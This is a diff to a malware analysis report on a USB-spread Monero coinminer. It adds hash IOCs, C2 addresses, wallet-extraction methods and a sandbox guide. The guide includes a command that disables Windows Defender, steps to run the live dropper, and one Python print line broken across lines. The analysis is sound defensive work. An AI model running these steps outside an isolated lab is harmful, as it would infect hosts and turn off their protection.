+> **Note on mining pool variation**: The ASEC report observed `r2.hashpoolpx.net`, while our CAPE sandbox captured `r3.hashpoolpx.net`. The HashPool infrastructure uses multiple subdomains (`r1`, `r2`, `r3`...) as mining pool endpoints. The specific subdomain may vary by campaign wave or config version.
 
-### 8.3 Behavioral IOCs
+### 8.2 File IOCs `[STATIC]` + `[JUJUBOX]` + `[CAPE]`
+
+| File | MD5 | SHA256 | Detection | Source |
+|------|-----|--------|-----------|--------|
+| `u297528.dat` (idll.dll) | `dbd8dbecaa80795c135137d69921fdba` | `e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba` | 55/71 `[VT]` | `[STATIC]` hashed locally |
+| `decrypted_payload.exe` | `e10a9bb09acb415e5dc8654b8593a45c` | `d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2` | 38/71 `[VT]` | `[STATIC]` hashed locally |
+| `embedded_00.bin` (miner) | `ce527e9ec2dd83c0565796f5420ce4e4` | `5543d3b826de134bc47212be344f0c7def51704516d40f611b406c6e98baaa3a` | 8/71 `[VT]` | `[STATIC]` extracted & hashed |
+| `embedded_01.bin` (dropper) | `00615f1a46899c659ad9582f43489f9f` | `2be97a48015544620fe1e3bb69b130a24ddbb31f9719173868579df489e9356c` | 54/70 `[VT]` | `[STATIC]` extracted & hashed |
+| `svctrl64.exe` (dropped) | `9bfa7a2991a8b62b5ef12a920b220e1e` | `ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e` | 57/75 `[VT]` | `[JUJUBOX]` dropped in sandbox |
+| `wlogz.dat` (config) | `9de2bb040c501effa18a630ddf3db103` | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` | 0/76 `[VT]` | `[JUJUBOX]` dropped in sandbox |
+
+### 8.3 Behavioral IOCs `[JUJUBOX]` + `[CAPE]`
 
 | IOC | Value |
 |-----|-------|
@@ -424,7 +719,9 @@ The ASEC report captured the XMRig execution parameters from a live infection:
 
 ---
 
-## 9. Why the Wallet Is Not in the Binary
+## 9. Why the Wallet Is Not in the Binary `[STATIC]` + `[CAPE]` + `[ASEC]`
+
+> **Key finding from static analysis `[STATIC]`**: Exhaustive search of all 4 binary artifacts using plaintext matching, single-byte XOR brute-force, RC4 brute-force with .data keys, uint32 pattern search, fragment search, and regex IP scanning found **zero matches** for the C2 IP `2.58.56.13`, the domains `umnsrx.net`/`umnxrc.net`, the mining pool `hashpoolpx.net`, or any `http://` URL pointing to the C2. These IOCs exist **only at runtime** — they are constructed as obfuscated stackstrings and/or stored in RC4-encrypted config blobs with dynamically computed keys. The only way to observe them is through sandbox execution `[CAPE]` `[JUJUBOX]` or ASEC intelligence `[ASEC]`.
 
 ### 9.1 The Config Retrieval Flow
 
@@ -458,16 +755,74 @@ Based on the combined evidence from static analysis, sandbox results, and ASEC i
 
 ### 9.2 How to Extract the Wallet
 
-Since the wallet is fetched from the C2 at runtime:
+Since the wallet is fetched from the C2 at runtime, we have 5 approaches:
 
-1. **Internet-connected sandbox** — Run `svctrl64.exe` with network access, capture the PostgreSQL C2 response
-2. **Memory forensics** — After miner is running, dump `svctrl64.exe` process memory and search for Monero address pattern: `4[1-9A-HJ-NP-Za-km-z]{94}`
-3. **Network interception** — TLS-pinned connection to HashPool reveals the wallet in the stratum `login` field
-4. **C2 seizure** — If the C2 server at `2.58.56.13` is seized, the PostgreSQL database would contain all wallet addresses
+**Approach 1: HTTP Config Interception (Most Reliable)**
+
+CAPE captured the HTTP GET to `http://2.58.56.13/inf.dat` — this response contains the **wallet address in plaintext** (the config is not encrypted over HTTP). If you run the malware in a local sandbox with Wireshark:
+
+```bash
+# Capture the HTTP response to inf.dat
+tshark -r capture.pcap -Y "http.content_type" -T fields -e http.file_data
+# OR
+tshark -r capture.pcap -Y "tcp.port == 80 && ip.addr == 2.58.56.13" -V
+```
+
+> **IMPORTANT**: The config download uses **unencrypted HTTP** (port 80), not HTTPS. The wallet address is in plaintext in the `inf.dat` response body.
+
+**Approach 2: Memory Dump (From CAPE or Local Sandbox)**
+
+After `svctrl64.exe` starts, dump its memory and search for the Monero address pattern:
+
+```python
+import re
+with open('svctrl64_memdump.dmp', 'rb') as f:
+    data = f.read()
+# Monero addresses: 95 chars, starts with 4, Base58 alphabet
+wallets = re.findall(rb'4[1-9A-HJ-NP-Za-km-z]{94}', data)
+for w in wallets:
+    print(f'[+] Wallet: {w.decode()}')
+```
+
+**Approach 3: stratum Protocol Analysis**
+
+The TLS-pinned connection to `r3.hashpoolpx.net:443` carries the wallet in the stratum `login` field. If you can capture the TLS handshake (or the pool is accessible without cert pinning), you can extract it:
+
+```
+stratum+tcp://r3.hashpoolpx.net:443
+login: <WALLET_ADDRESS>
+password: x
+```
+
+**Approach 4: Network Sinkhole**
+
+Configure your sandbox DNS to redirect `umnsrx.net` and `2.58.56.13` to a local sinkhole server that logs all requests and responses:
+
+```bash
+# Set up dnsmasq to sinkhole the C2
+echo "address=/umnsrx.net/127.0.0.1" >> /etc/dnsmasq.conf
+echo "address=/hashpoolpx.net/127.0.0.1" >> /etc/dnsmasq.conf
+# The malware will try to connect, and you can serve your own inf.dat
+# that forces the miner to use a known wallet, or log the request
+```
+
+**Approach 5: VT Premium Download**
+
+If you have VT Premium access, download the CAPE memory dumps directly:
+
+```python
+# Download the memory dumps from CAPE analysis
+for dump_sha in cape_memory_dump_hashes:
+    resp = requests.get(
+        f"https://www.virustotal.com/api/v3/files/{dump_sha}/download",
+        headers={"x-apikey": VT_PREMIUM_KEY}
+    )
+    # Search for wallet in each dump
+```
 
 ---
 
-## 10. Complete Attack Chain (Full)
+## 10. Complete Attack Chain (Full) `[STATIC]` + `[JUJUBOX]` + `[CAPE]` + `[ASEC]`
 
 ```
 1. USB device inserted into Windows host
@@ -537,7 +892,7 @@ Since the wallet is fetched from the C2 at runtime:
 
 ---
 
-## 11. Anti-Detection Techniques Summary
+## 11. Anti-Detection Techniques Summary `[STATIC]` + `[CAPE]` + `[ASEC]`
 
 | Technique | Implementation | Purpose |
 |-----------|---------------|---------|
@@ -558,7 +913,7 @@ Since the wallet is fetched from the C2 at runtime:
 
 ---
 
-## 12. YARA Detection Rules for Miner Components
+## 12. YARA Detection Rules for Miner Components `[STATIC]`
 
 ```yara
 rule printminer_dropper {
@@ -602,7 +957,7 @@ rule printminer_config {
 
 ---
 
-## 13. Tools Used
+## 13. Tools Used `[STATIC]` + `[VT]` + `[CAPE]` + `[WEB]`
 
 | Tool | Purpose |
 |------|---------|
@@ -618,10 +973,248 @@ rule printminer_config {
 
 ---
 
-## 14. References
+## 14. Local Sandbox Setup Guide — Extracting svctrl64.exe `[STATIC]` methodology
+
+To run the dropper locally and capture `svctrl64.exe` + the wallet address from memory, you need a **Windows x64 VM** with monitoring tools. Here are three approaches:
+
+### 14.1 Option A: CAPE Sandbox (Docker — Requires Nested VM)
+
+CAPE is the most powerful option but requires nested virtualization:
+
+```bash
+# Step 1: Verify nested VM support
+grep -E '(vmx|svm)' /proc/cpuinfo  # Must show vmx (Intel) or svm (AMD)
+
+# Step 2: Enable KVM (if supported)
+sudo modprobe kvm_intel  # or kvm_amd
+ls /dev/kvm              # Should exist
+
+# Step 3: Install Docker
+sudo apt install docker.io
+sudo systemctl start docker
+
+# Step 4: Pull and run CAPE
+docker pull capesandbox/cape:latest
+docker run -d \
+  --name cape \
+  -p 8000:8000 \
+  --privileged \
+  -v /dev/kvm:/dev/kvm \
+  capesandbox/cape:latest
+
+# Step 5: Submit the decrypted payload via web UI
+# Open http://localhost:8000
+# Upload decrypted_payload.exe
+# Wait for analysis (typically 10-20 minutes)
+
+# Step 6: Download results
+# The CAPE report will include:
+#   - All dropped files (svctrl64.exe, wlogz.dat, WinRing0x64.sys)
+#   - Memory dumps (containing decrypted wallet)
+#   - PCAP (full network traffic)
+#   - Process tree
+#   - All registry modifications
+```
+
+**Problem**: On this system (Kali Linux, no KVM), nested virtualization is **not available**. The CAPE Docker container requires a Windows guest VM inside it, which needs hardware virtualization support.
+
+**Workaround**: Use a physical Windows machine or a cloud VM with nested virtualization (e.g., AWS EC2 with `.metal` instances, or GCP with nested VM enabled).
+
+### 14.2 Option B: Cuckoo Sandbox (Standalone)
+
+Cuckoo is lighter than CAPE but requires a separate Windows VM:
+
+```bash
+# Step 1: Create a Windows 10 x64 VM (VirtualBox or QEMU)
+vboxmanage createvm --name "cuckoo-guest" --register
+vboxmanage modifyvm "cuckoo-guest" --memory 4096 --cpus 2
+vboxmanage createvdi --filename cuckoo-guest.vdi --size 50000
+# Install Windows 10 on this VM
+
+# Step 2: Install Cuckoo
+pip3 install cuckoo
+cuckoo init
+cuckoo community
+
+# Step 3: Configure the VM in cuckoo.conf
+# Edit ~/.cuckoo/conf/virtualbox.conf:
+#   machines = cuckoo-guest
+#   label = cuckoo-guest
+
+# Step 4: Submit sample
+cuckoo submit /path/to/decrypted_payload.exe
+
+# Step 5: View report
+cuckoo results  # or open web UI at http://localhost:8080
+```
+
+### 14.3 Option C: Lightweight Manual Sandbox (Recommended for Wallet Extraction)
+
+The simplest approach — run on a real or virtual Windows machine with monitoring:
+
+```powershell
+# === PREPARATION (on Windows) ===
+
+# 1. Disable Windows Defender real-time protection (temporarily)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# 2. Install monitoring tools
+#    - Process Monitor (ProcMon) from Sysinternals
+#    - Process Explorer (to watch process tree)
+#    - Wireshark (to capture network traffic)
+#    - API Monitor (rohitab.com) — for syscall tracing
+
+# === EXECUTION ===
+
+# 3. Start Process Monitor with filter:
+#    - Process Name: decrypted_payload.exe, svctrl64.exe
+#    - Operation: Write, CreateFile, RegSetValue
+
+# 4. Start Wireshark capture on all interfaces
+
+# 5. Execute the decrypted payload
+#    IMPORTANT: The DLL must be called with parameter '1'
+#    rundll32.exe idll.dll,IdllEntry 1
+#    OR just execute decrypted_payload.exe directly
+
+# 6. Wait 5 seconds (the dropper self-deletes, svctrl64.exe starts)
+
+# === EXTRACTION ===
+
+# 7. Immediately copy svctrl64.exe from C:\Windows\System32\
+Copy-Item "C:\Windows\System32\svctrl64.exe" -Destination "C:\analysis\svctrl64.exe"
+
+# 8. Copy ALL dropped files from C:\Windows\System32\wsvcz\ 
+Copy-Item "C:\Windows\System32\wsvcz\*" -Destination "C:\analysis\wsvcz\"
+#    This includes:
+#    - wlogz.dat (32-byte config key)
+#    - u882029.exe (XMRig miner)
+#    - WinRing0x64.sys (vulnerable driver)
+#    - u395697.dat, u967181, u799791, u459733
+
+# 9. Copy the service DLL
+Copy-Item "C:\Windows\System32\u760237.dll" -Destination "C:\analysis\u760237.dll"
+
+# === MEMORY DUMP FOR WALLET ===
+
+# 10. Dump svctrl64.exe process memory (this contains the decrypted wallet)
+#     Using Process Explorer:
+#     Right-click svctrl64.exe -> Create Dump -> Create Mini Dump
+#     OR using procdump:
+procdump -ma svctrl64.exe C:\analysis\svctrl64_memdump.dmp
+
+# 11. Search the memory dump for the Monero wallet address
+#     Monero addresses start with '4' and are 95 characters long
+#     They use the Base58 alphabet: [1-9A-HJ-NP-Za-km-z] (no 0, O, I, l)
+python3 -c "
+import re
+with open('svctrl64_memdump.dmp', 'rb') as f:
+    data = f.read()
+# Search for Monero address pattern
+matches = re.findall(rb'4[1-9A-HJ-NP-Za-km-z]{94}', data)
+for m in matches:
+    print(f'[+] Possible wallet: {m.decode()}')
+"
+
+# === NETWORK CAPTURE ===
+
+# 12. In Wireshark, filter for the C2 IPs
+#     ip.addr == 2.58.56.13 || ip.addr == 2.58.56.217 || ip.addr == 91.206.169.76
+#     Look for:
+#     - HTTP GET to 2.58.56.13/inf.dat (wallet config download)
+#     - TLS connections to 2.58.56.217:443 (C2)
+#     - TLS connections to 91.206.169.76:443 (mining pool)
+
+# 13. The inf.dat HTTP response contains the wallet address in plaintext
+#     Extract it from the PCAP:
+tshark -r capture.pcap -Y "http.request.uri contains inf.dat" -V
+```
+
+### 14.4 Quick Approach: Emulation with QEMU + WinDbg
+
+For a faster setup without full sandbox infrastructure:
+
+```bash
+# Step 1: Install QEMU
+sudo apt install qemu-system-x86 qemu-kvm
+
+# Step 2: Create a Windows VM disk
+qemu-img create -f qcow2 win10.qcow2 50G
+
+# Step 3: Install Windows from ISO
+qemu-system-x86_64 \
+  -m 4096 -smp 2 \
+  -drive file=win10.qcow2,format=qcow2 \
+  -cdrom Win10_x64.iso \
+  -net nic -net user \
+  -enable-kvm
+
+# Step 4: After Windows is installed, boot with debugging
+qemu-system-x86_64 \
+  -m 4096 -smp 2 \
+  -drive file=win10.qcow2,format=qcow2 \
+  -net nic -net user,hostfwd=tcp::4444-:4444 \
+  -enable-kvm
+
+# Step 5: Inside the Windows VM, install WinDbg and set up kernel debugging
+# Step 6: Transfer decrypted_payload.exe into the VM
+# Step 7: Run the malware under WinDbg monitoring
+# Step 8: When svctrl64.exe starts, break and dump memory
+```
+
+### 14.5 What Each Approach Will Yield
+
+| Approach | svctrl64.exe | wlogz.dat | Wallet Address | PCAP | Memory Dump | Complexity |
+|----------|-------------|-----------|----------------|------|-------------|------------|
+| CAPE (Docker) | YES | YES | YES (from memdump) | YES | YES (9 dumps) | **Hard** (nested VM) |
+| Cuckoo | YES | YES | YES (from memdump) | YES | YES | **Medium** (separate VM) |
+| Manual + ProcMon | YES | YES | YES (from procdump) | YES (Wireshark) | YES (procdump) | **Easy** |
+| QEMU + WinDbg | YES | YES | MAYBE | NO | YES (manual) | **Medium** |
+| VT Jujubox | NO (cloud only) | NO | NO (no download) | NO | NO | **None** (cloud) |
+| VT CAPE | YES (from report) | YES | MAYBE (from payload hashes) | YES | YES (hashes only) | **None** (cloud) |
+
+### 14.6 Critical: Downloading CAPE Dropped Files from VirusTotal `[VT]`
+
+The VT API (even with the current key) **cannot download dropped files** — that requires VT Premium (`/v3/files/{hash}/download`). However, we can check their hashes and metadata:
+
+```python
+# Verify hashes of files captured by CAPE
+import requests
+VT_KEY = "<REDACTED>"
+
+# svctrl64.exe (dropped by the dropper)
+resp = requests.get(
+    "https://www.virustotal.com/api/v3/files/ec860277d21159deb084b7849149a370"
+    "0d98dc42d7d69e2e3acceed6dbe3158e",
+    headers={"x-apikey": VT_KEY}
+)
+print(f"Detection: {resp.json()['data']['attributes']['last_analysis_stats']}
+")
+# → {'malicious': 57, 'undetected': 18} (57/75)
+
+# WinRing0x64.sys (signed vulnerable driver)
+resp = requests.get(
+    "https://www.virustotal.com/api/v3/files/11BD2C9F9E2397C9A16E099"
+    "0E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5",
+    headers={"x-apikey": VT_KEY}
+)
+print(f"Detection: {resp.json()['data']['attributes']['last_analysis_stats']}
+")
+```
+
+To actually **download** `svctrl64.exe` and the other dropped files, you need:
+1. **VT Premium account** — enables `/v3/files/{hash}/download` endpoint
+2. **Manual extraction** — run the dropper in a local sandbox and copy files
+3. **Malware Bazaar / Abuse.ch** — some hashes may be available for download
+
+---
+
+## 15. References
 
 1. AhnLab ASEC, "CoinMiner Malware Being Continuously Distributed via USB" (Nov 2025): https://asec.ahnlab.com/en/91415/
 2. AhnLab ASEC, "CoinMiner Malware Distributed via USB" (Feb 2025): https://asec.ahnlab.com/en/86221/
 3. Mandiant, DIRTYBULK / CUTFAIL report (Jul 2025)
 4. VirusTotal File Report — u297528.dat: https://www.virustotal.com/gui/file/e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba
 5. VirusTotal File Report — decrypted_payload.exe: https://www.virustotal.com/gui/file/d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2
+6. LOLDrivers — WinRing0x64.sys: https://www.loldrivers.io/drivers/11bd2c9f-9e23-97c9-a16e-0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5/
+7. Sigma Rule — Vulnerable WinRing0 Driver Load: https://github.com/SigmaHQ/sigma/blob/main/rules/windows/driver_load/driver_load_win_vuln_winring0x64.yml
